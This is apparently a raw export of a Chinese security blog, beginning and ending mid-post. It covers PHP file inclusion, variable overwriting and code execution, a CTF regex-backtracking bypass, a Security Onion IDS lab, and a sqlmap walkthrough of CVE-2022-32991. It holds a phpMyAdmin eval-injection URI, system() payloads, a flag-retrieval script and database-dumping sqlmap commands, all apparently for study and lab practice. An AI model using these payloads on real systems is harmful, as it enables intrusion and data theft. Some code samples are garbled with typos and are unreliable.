&#x2F;home&#x2F;app&#x2F;aaa<br>&#x2F;&#x2F;&#x2F;则实际上，以下在允许范围内<br>&#x2F;home&#x2F;app&#x2F;aaa<br>&#x2F;home&#x2F;app&#x2F;aaabbb<br>&#x2F;home&#x2F;app&#x2F;aaa123</p><p>若要指定则open_basedir&#x3D;   &#x2F;home&#x2F;app&#x2F;aaa&#x2F;<br>Windows 多目录用’；‘ ，linux用’：‘<br>&#x2F;&#x2F;可以利用枚举，让用户不可控<br><strong>1.2远程文件包含</strong><br> allowurl_include设置为ON  ，include&#x2F;require可以加载远程文件</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050057157.png" alt="image-20230405005726066"></p><p>远程文件包含<br><a href="http://www.a.com/textb.php?text=http://www.b.com/test1.txt">www.a.com/textb.php?text=http://www.b.com/test1.txt</a>?<br><strong>1.3本地文件包含利用技巧</strong><br>之所以可以执行命令，是因为用户可以控制文件包含的内容<br> (1)包含用户上传的文件。<br>(2)包含 data:&#x2F;&#x2F; 或 php:&#x2F;&#x2F;input 等伪协议。<br>(3)包含Session文件。<br>(4)包含曰志文件，比如Web Server的access log。<br>(5)包含&#x2F;proc&#x2F;self&#x2F;environ 文件。<br>(6)包含上传的临时文件(RFC1867)。<br>(7)包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。<br> session( 只有客户端才能访问，程序为该客户添加一个 session。session中主要保存用户的登录信息、操作信息等等。此 session将在用户访问结束后自动消失)<br> 1.包含用户上传文件能否攻击成功，取决于文件上传功能的设计，比如要求知道用户上传 后文件所在的物理路径，有时这个路径很难猜到。（上传文件的目录不一定是上传文件所在的目录）。<br>2.伪协议如php:&#x2F;&#x2F;input等需要服务器支持，同时要求allowurl_include设置为ON。在PHP5.2.0之后的版本中支持data:伪协议，可以很方便地执行代码，它同样要求allowurl_ include 为ON。<br>**    2变量覆盖漏洞**<br>      **    2.1全局变量覆盖**<br>                    条件：变量未被初始化且能被用户控制<br>                      register_globals为on 最为严重  ，  php4.2.0之后的版本默认变成了pff               </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Register globals:&quot;</span>.(<span class="hljs-keyword">int</span>)ini <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;register globals&quot;</span>).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;register_globals&#x27;</span>))&#123; <br><span class="hljs-keyword">foreach</span>($ REQUEST aS<span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)<span class="hljs-keyword">unset</span>($&#123;<span class="hljs-variable">$k</span>&#125;);<br><span class="hljs-keyword">print</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-variable">$_GET</span>[b];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>$a未初始化，在register_globals为on ，会因为这个代码而出错。<br>而尝试注入globals[a]覆盖全局变量，则可以控制$a的值,<br>(unset()默认只会销毁局部变量，销毁全局变量必须使用$globals)。<br><strong>2.2extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">extract</span> ( <span class="hljs-keyword">array</span> <span class="hljs-variable">$var_array</span> [,<span class="hljs-keyword">int</span> <span class="hljs-variable">$extract_type</span>[,<span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span>]] )<br></code></pre></td></tr></table></figure><p>第二个参数指定函数变量导入符号表时的行为，两个值extr_overwrite和extr_skip<br>是extr_overwrite时，变量名冲突，覆盖。<br>是extr_skip时，变量名冲突，不覆盖。<br>若未指定，默认为extr_overwrite。<br><strong>2.3遍历初始化变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$chs</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>($ POST &amp;&amp; <span class="hljs-variable">$charset</span>!=<span class="hljs-string">&#x27;utf-8&#x27;</span>)&#123;<br><span class="hljs-variable">$chs</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Chinese</span>(UTF-<span class="hljs-number">8</span><span class="hljs-string">&#x27;$charset&#x27;</span>); <br><span class="hljs-keyword">foreach</span>($ POST <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt; <span class="hljs-variable">$value</span>) &#123;<br><span class="hljs-variable">$$key</span>=<span class="hljs-variable">$chs</span>-&gt;<span class="hljs-title function_ invoke__">Convert</span>(<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$chs</span>);<br><br></code></pre></td></tr></table></figure><p>传chs，会覆盖$chs的值，<br><strong>2.4import_request_variables变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> import request <span class="hljs-title function_ invoke__">variables</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$types</span> [，<span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span>])<br></code></pre></td></tr></table></figure><p>import_request_variables会将get，post，cookie中的变量导入到全局，使用这个函数只需要指定类型，第二个参数是导入变量的添加的前缀，如果没有就覆盖全局变量。<br><strong>2.5parse_str()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">void_parse_str</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span> [,<span class="hljs-keyword">array</span>&amp;<span class="hljs-variable">$arr</span>])<br></code></pre></td></tr></table></figure><p>parse_str()函数解析URL的query string，当参数能被用户控制时，导致变量覆盖。<br>在**[BJDCTF2020]Mark loves cat题中** 利用了变量覆盖利用了exit($is)<br><strong>3.代码执行漏洞</strong><br>存在函数输入且有可以执行代码的危险函数<br><strong>3.1危险函数执行代码</strong><br>危险函数 popen(),system(),passthru(),exec()。<br>phpmyadmin版本3.3.10.2与3.4.3.1存在变量覆盖漏洞CVE-2011-2505,漏洞存在于libraries&#x2F;swekey&#x2F;swekey.auth,lib.php。<br>通过parse_str（）覆盖变量漏洞，且session保存在服务器端，所以可以通过覆盖$_session,原本程序执行到  session_destroy()将销毁session   ，但是session_write_close()已经把$session保存下来了,<br>session_id试图切换session，会导致XSS,SQL注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-variable">$ret</span>.=<span class="hljs-string">&#x27;/*Server:&#x27;</span><span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-variable">$cf</span>-&gt;<span class="hljs-title function_ invoke__">qetServerName</span>(<span class="hljs-variable">$id</span>)，<span class="hljs-string">&#x27;*/&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>)<span class="hljs-string">&quot;[<span class="hljs-subst">$id</span>]*/&quot;</span> .<span class="hljs-variable">$crlf</span>.<span class="hljs-string">&#x27;$i++;&#x27;</span>.<span class="hljs-variable">$crlf</span>;<br><br></code></pre></td></tr></table></figure><p>对strtr处理却没对$id做处理。$id是数组变量$c[‘sercers’]的key。<br>$c是函数的返回结果：$c&#x3D;$cf-&gt;getconfig();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Returns configuration array(full, multidimensional format)</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConfig</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$SESSION</span>[<span class="hljs-variable language_">$this</span>-&gt;id];<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;cfgUpdateReadMapping <span class="hljs-keyword">as</span> <span class="hljs-variable">$map_to</span>=&gt; <span class="hljs-variable">$map</span> <span class="hljs-keyword">from</span>)&#123;<br><span class="hljs-title function_ invoke__">PMA_array_write</span>(<span class="hljs-variable">$map_to</span>, <span class="hljs-variable">$c</span>, PMA <span class="hljs-keyword">array</span> <span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$map_from</span>, <span class="hljs-variable">$c</span>)); PMA <span class="hljs-title function_ invoke__">array_remove</span>(<span class="hljs-variable">$map_from</span>, <span class="hljs-variable">$c</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$c</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>$c是session中来的，通过parse_str（）覆盖session中任意变量的值，*&#x2F;闭合注释符，插入代码执行（插入到config&#x2F;config.ini.php）。<br>条件是config目录存在且可写，很多时候管理员在初始化完成后删除config目录。<br>wofeiwo写的的一段例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">uri=<span class="hljs-string">&quot;/libraries/auth/swekey/swekey.auth.lib.php?session_to_unset=HelloThere&amp;_SESSION[ConfigFile0]</span><br><span class="hljs-string">[Servers][*/eval(getenv(&#x27;HTTP CODE&#x27;));</span><br><span class="hljs-string">/*][host]=Hacked+By+PMA&amp; SESSION[ConfiaFilellSe rvers]</span><br><span class="hljs-string">[*/eval(getenv(HTTP CODE));</span><br><span class="hljs-string">/*][host]=Hacked+By+PMA&quot;</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">        &quot;*/ecal()/*&quot;注入到了session变量的key中</code></pre><p>MyBB1.4远程代码执行<br>flyh4t发现的MyBB1.4 admin remote code execution vulnerability<br>首先MyBB代码中存在eval（）函数<br><strong>挖掘漏洞过程，找危险函数，回溯函数调用过程，看整个过程是否有可控输入。</strong><br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058021.png" alt="image-20230405005817953"><br>eval（）输入来自于$templates-&gt;get(“index”),找调用过程，get是数据库取出的，取出时addslashes（）做了处理，可以通过编辑模板功能将数据写入数据库，调用前台文件，使eval（）执行。但需要处理敏感字符<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050058521.png" alt="image-20230405005832434"><br><strong>3.2“文件写入”执行代码</strong><br>在database.inc.php导入zip文件时，存在写文操作，对其安全的判断过于简单，导致用户可以将文件内容改为php代码执行<br>控制文件后缀为’&#x2F;.sql’<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100751.png" alt="image-20230405010005611"><br>可apache不认识.sql将其解析为php执行。<br><strong>3.3其他执行代码方式</strong><br>直接执行带码的函数：<br>        eval(),system(),exec(),shell_exec(),passthru(),escapesheelcmd(),pcntl_exce()等。<br>文件包含：include(),include_once(),require(),require_once()。<br>本地文件写入：file_put_contents(),fwrite(),fputs()等<br>preg_replace()代码执行：<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050100357.png" alt="image-20230405010032242"><br>动态函数执行：<br>用户自定义的动态函数可以导致代码执行<br><?php$dyn_func= $ GET['dyn func'];$argument=$GET['argument'];$dyn_finc($argument);?><br>可以导致代码直接执行：url&#x2F;index.php?dyn_finc&#x3D;system&amp;argument&#x3D;ls<br>类似的还有create_function()函数：</p><?php$foobar=$ GET['foobar'];$dyn_func=create function('$foobar’"echo $foobar;");$dyn_func('');?><p>payload：url&#x2F;index.php?dyn_finc&#x3D;system（’ls‘）<br><strong>curly Syntax</strong><br>curly Syntax会导致命令执行，它将执行花括号间的代码，并将结果替换回去。<br><strong>回调函数执行代码</strong><br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101327.png" alt="image-20230405010057687"><br>ob_strat()也可以执行回调函数<br><strong>unserialize（）导致代码执行</strong><br>他将反序列化的数据重新映射为PHP变量，unserialize在执行时如果定义了**_destruct()<strong>函数或</strong>_wakeup()**函数，则这两个函数会被执行<br><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304050101601.png" alt="image-20230405010135513"><br>payload：可以先在本地搭建环境测试payload。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>变量覆盖</title>
    <link href="/2023/03/27/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
    <url>/2023/03/27/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
    
    <content type="html"><![CDATA[<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>layout: 变量覆盖<br>源码泄露<br>.swp未正常关闭的文件<br>Linux下，非正常关闭的vi编辑器会生成一个后缀为.swp的文件，<br>用IDM下载器将.index.php.swp下载下来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jiuzhe</span>(<span class="hljs-params"><span class="hljs-variable">$xdmtql</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>); <span class="hljs-comment">//正则表达匹配</span><br>  &#125;<br><br>  <span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$xdmtql</span>))&#123; <span class="hljs-comment">//xdmtql不能是数组</span><br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">jiuzhe</span>(<span class="hljs-variable">$xdmtql</span>))&#123;  <span class="hljs-comment">//不能让他匹配到</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123; <span class="hljs-comment">//strpos()函数查找字符串在另一字符串中第一次出现的位置(区分大小写)。</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;*******&#125;&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true .swp file?&#x27;</span>;<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nijilenijile&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单审计可知，既要让正则表达匹配不到sys.<em>nb，又要使其存在sys nb ，这里要简单介绍一下正则匹配<br>. 表示 匹配除换行符 \n 之外的任何单字符，</em>表示零次或多次。<br>.*贪婪模式：如果用sys.*nb匹配sysaaaaaaaanbaaaaaaaaanb,他就会匹配最长字符串sysaaaaaaaanbaaaaaaaaanb<br>.?<em>和.+?非贪婪模式：?跟在</em>或者+后边用时，表示懒惰模式。也称非贪婪模式。就是匹配尽可能少的字符。就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。<br>如果用sys.?*nb和sys.+?nb匹配sysaaaaaaaanbaaaaaaaaanb，他就会匹配最短的sysaaaaaaaanb。<br>接下来就要利用匹配中的回溯<br>回溯必须要了解正则匹配的方式：<br><strong>NFA</strong>（确定型有穷自动机）、<strong>DFA</strong>（不确定型有穷自动机）。说白了就是：<strong>以正则表达式主导</strong>还是<strong>以字符串主导</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">text ＝ <span class="hljs-string">&#x27;after tonight&#x27;</span> <br>regex ＝ <span class="hljs-string">&#x27;to(nite|nighta|night)&#x27;</span><br></code></pre></td></tr></table></figure><p>对于NFA来说，以正则表达式主导，也就是拿着正则表达式去比较待匹配字符串。匹配的过程如下：</p><ul><li><p>最开始，正则拿出t字符与待匹配字符串中的a进行匹配，匹配失败</p></li><li><p>然后同理匹配f也失败，直到匹配到f后面的t字符</p></li><li><p>这个时候正则会拿出第二个字符o进行匹配，然而o与e字符不一样，匹配失败，这个时候正则表达式<strong>回溯</strong>到第一个字符t</p></li><li><p>因为上方匹配失败，接下去匹配下一个t字符，直到匹配到空格后面的t字符</p></li><li><p>同理，这个时候正则拿出第二个字符o进行匹配，发现与上一步匹配到的o字符一样，匹配成功</p></li><li><p>接着匹配后面三个待匹配字符，依次类推</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">text ＝ <span class="hljs-string">&#x27;after tonight&#x27;</span> <br>regex ＝ <span class="hljs-string">&#x27;to(nite|nighta|night)&#x27;</span><br></code></pre></td></tr></table></figure><p>同样的还是这一个例子，对于<strong>DFA引擎</strong>，匹配过程如下：</p></li><li><p>最开始，待匹配字符串拿出第一个字符a来与正则的第一个字符t匹配，匹配失败</p></li><li><p>匹配失败后，待匹配字符串拿出第二个字符f与正则的第一个字符t匹配，匹配失败</p></li><li><p>匹配失败后，待匹配字符串拿出第三个字符t与正则的第一个字符t匹配，匹配成功</p></li><li><p>此时待匹配字符串拿出第四个字符e与正则的第二个字符o进行匹配，匹配失败，正则<strong>回溯</strong>到t</p></li><li><p>同理，直到待匹配字符串拿出空格后面的t字符匹配时，才匹配成功</p></li><li><p>同理o也匹配成功</p></li><li><p>匹配成功后待匹配字符串就会拿出n与正则中的三项可选匹配进行并行匹配</p></li><li><p>以此类推</p></li></ul><p>这个题贪婪和回溯结合在一起产生了漏洞，那我们只要让他超过匹配的最大长度。构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><br>data = &#123;<br><br>    <span class="hljs-string">&#x27;xdmtql&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;sys nb&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">100000</span>)<br><br>&#125;<br><br><br>res = requests.post(<span class="hljs-string">&#x27;http://e5e6a9fc-e957-4ac8-89ff-e605a16d3656.www.polarctf.com:8090/&#x27;</span>,data=data)<br><br><span class="hljs-built_in">print</span>(res.text)<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDS系统</title>
    <link href="/2023/03/11/%E5%8F%AF%E8%A7%86%E5%8C%96IDS%E7%B3%BB%E7%BB%9FSecurity%20Onion/"/>
    <url>/2023/03/11/%E5%8F%AF%E8%A7%86%E5%8C%96IDS%E7%B3%BB%E7%BB%9FSecurity%20Onion/</url>
    
    <content type="html"><![CDATA[<h1 id="可视化IDS系统Security-Onion"><a href="#可视化IDS系统Security-Onion" class="headerlink" title="可视化IDS系统Security Onion"></a>可视化IDS系统Security Onion</h1><h3 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h3><p>这里我们用开源的集成系统Security Onion，Security Onion是一个集成了多种安全工具的Linux发行版，旨在为安全专业人士提供一个完整的安全监控解决方案。</p><p>环境：</p><p>securityonion-12.04.5.3-20150825.iso</p><p>虚拟机软件： Vmware workstation 16 pro</p><p>分配内存：4G</p><p>分配网卡： 1块</p><p>分配磁盘空间： 30G</p><p>安装完成之后我们进行setup</p><p><img src="C:/Users/lenovo/AppData/Local/Temp/ksohtml10220/wps1.jpg" alt="img"> </p><p>配置网卡，我之添加了一块网卡</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072321499.jpg" alt="img"> </p><p>所以我这个是管理接口和监听接口合二为一了，配置完以后重启服务器。</p><p>重新进入setup这里我们选快速安装。</p><p><img src="C:/Users/lenovo/AppData/Local/Temp/ksohtml10220/wps3.jpg" alt="img"> </p><p>这里安装的是Snorby，（Snorby是一个基于Web的前端界面，用于管理和分析Snort和Suricata等入侵检测系统生成的日志。）Snorby使用电子邮件地址作为独立认证机制，以便用户可以使用自己的电子邮件地址登录Snorby系统。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072321503.jpg" alt="img"> </p><p>在登录后，用户可以查看和分析Snort和Suricata等入侵检测系统生成的报警日志，以便快速发现和处理安全事件。</p><p>Snorby可以帮助用户更好地理解和分析报警日志。例如，它可以将报警日志按照时间、源IP地址、目标IP地址等进行分组和排序，以便用户更好地了解安全事件的发生和演变过程。并且，Snorby还提供了一些图表和可视化工具，可以帮助用户更好地理解和分析报警日志。</p><p>安装完成后登录，利用浏览器输入我们的ip进行访问<a href="https://192.168.1.8,利用我们刚刚设置的邮箱及密码进行访问./">https://192.168.1.8，利用我们刚刚设置的邮箱及密码进行访问。</a></p><h3 id="5-1-3用kali对装有入侵检测的服务器进行扫描"><a href="#5-1-3用kali对装有入侵检测的服务器进行扫描" class="headerlink" title="5.1.3用kali对装有入侵检测的服务器进行扫描"></a><strong>5.1.3用kali对装有入侵检测的服务器进行扫描</strong></h3><p>环境搭建完成之后呢我们对其进行测试，打开kali，输入ifconfig，得到本机ip为192.168.1.13，对服务器进行通讯测试 ping 192.168.1.8</p><p>服务器对kali进行通讯测试，ping 192.168.1.13</p><p>利用kali下的nmap对服务器端口进行扫描</p><p>Nmap 192.168.1.8 </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072321505.jpg" alt="img"> </p><p>扫描到目标服务器的开放端口</p><p>同时利用awvs对192.168.1.8进行扫描</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072321533.jpg" alt="img"> </p><h3 id="5-1-4系统报警"><a href="#5-1-4系统报警" class="headerlink" title="5.1.4系统报警"></a><strong>5.1.4系统报警</strong></h3><p>当用扫描器对我们的服务器进行扫描时，此时我们的IDS产生了警报</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304072321998.jpg" alt="img"> </p><p>发现了异常的扫描流量</p><p><img src="C:/Users/lenovo/AppData/Local/Temp/ksohtml10220/wps8.jpg" alt="img">我们发现，源IP地址为192.168.1.13的主机对我们的端口进行了扫描操作，这次扫描被我们的入侵检测系统成功地检测到了。</p><p>通过这个实例我们可以发现入侵检测系统是一种非常有用的技术，可以通过特征分析帮助我们快速识别安全事件，提高对潜在攻击的警觉性，从而采取相应的措施来保护计算机系统和网络安全。但是，我们也要注意入侵检测系统的局限性，比如无法识别新型攻击、误报率较高等问题。</p><p>因此，我们需要不断更新和完善入侵检测系统的技术，与其它安全技术相结合，加强对网络安全的保护。同时，我们也应该采取其他措施，如加强网络安全意识教育、完善网络安全管理制度等，共同构建一个安全可靠的网络环境。</p><p><strong>参考：</strong></p><p>快速安装可视化IDS系统Security Onion（<a href="http://chenguang.blog.51cto.com/350944/1783994%EF%BC%89%EF%BC%88%E6%9D%8E%E6%99%A8%E5%85%89%E8%80%81%E5%B8%88%EF%BC%89">http://chenguang.blog.51cto.com/350944/1783994）（李晨光老师）</a></p>]]></content>
    
    
    <categories>
      
      <category>Onion</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-32991</title>
    <link href="/2023/02/26/CVE-2022-32991/"/>
    <url>/2023/02/26/CVE-2022-32991/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h1><h2 id="CVE-2022-32991-简介"><a href="#CVE-2022-32991-简介" class="headerlink" title="CVE-2022-32991 简介"></a>CVE-2022-32991 简介</h2><p><code>Sourcecodester Web Based Quiz System</code>是 （<code>Sourcecodester</code>）开源的一个应用软件。用于一个简单的在线基础的项目。<br> <code>Web Based Quiz System v1.0</code>版本存在安全漏洞，该漏洞源于通过<code>welcome.**php**</code>中的<code>eid</code> 参数发现存在 SQL 注入漏洞。</p><h3 id="所用工具："><a href="#所用工具：" class="headerlink" title="所用工具："></a>所用工具：</h3><p>burp suite ，sqlmap</p><h2 id="环境以春秋云镜靶场为例"><a href="#环境以春秋云镜靶场为例" class="headerlink" title="环境以春秋云镜靶场为例"></a>环境以春秋云镜靶场为例</h2><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171420356.png"></p><h3 id="进入题目注册"><a href="#进入题目注册" class="headerlink" title="进入题目注册"></a>进入题目注册</h3><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171427894.png" alt="image-20230417142745758"></p><p>注册成功用注册的邮箱密码登录</p><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171429972.png" alt="image-20230417142951895"></p><p>该漏洞源于通过<code>welcome.**php**</code>中的<code>eid</code> 参数发现存在 SQL 注入漏洞，而这里是q&#x3D;1，这里不是注入点，点start</p><h3 id="找注入点"><a href="#找注入点" class="headerlink" title="找注入点"></a>找注入点</h3><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171436188.png" alt="image-20230417143614117"></p><p>发现注入点，eid</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171436921.png" alt="image-20230417143643849"></p><h3 id="burp抓包"><a href="#burp抓包" class="headerlink" title="burp抓包"></a>burp抓包</h3><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171437126.png" alt="image-20230417143740054"></p><p>将内容保存为1.txt 放入sqlmap，</p><h3 id="sqlmap爆破"><a href="#sqlmap爆破" class="headerlink" title="sqlmap爆破"></a>sqlmap爆破</h3><p>sqlmap参数：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">--cookie</span>                        <span class="hljs-comment">#绕过身份验证</span><br><span class="hljs-params">--random-agent</span>或<span class="hljs-params">--user-agent</span>    <span class="hljs-comment">#绕过客户端验证</span><br><span class="hljs-params">--batch</span>                         <span class="hljs-comment">#默认后续sqlmap操作都为Y</span><br><span class="hljs-params">--p</span>                             <span class="hljs-comment">#指定sqlmap注入的传参参数</span><br></code></pre></td></tr></table></figure><p>进行爆破</p><p>爆出库名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -r C:\Users\lenovo\Desktop\<span class="hljs-number">4</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--random-agent</span> -<span class="hljs-selector-tag">p</span> eid<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304171541507.png" alt="image-20230417153901826"></p><p>爆出ctf库中的表名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap-master\sqlmap-master&gt;python sqlmap<span class="hljs-selector-class">.py</span> -r C:\Users\lenovo\Desktop\<span class="hljs-number">4</span><span class="hljs-selector-class">.txt</span> -D <span class="hljs-string">&quot;ctf&quot;</span> <span class="hljs-attr">--tables</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--random-agent</span> -<span class="hljs-selector-tag">p</span> eid<br></code></pre></td></tr></table></figure><p><img 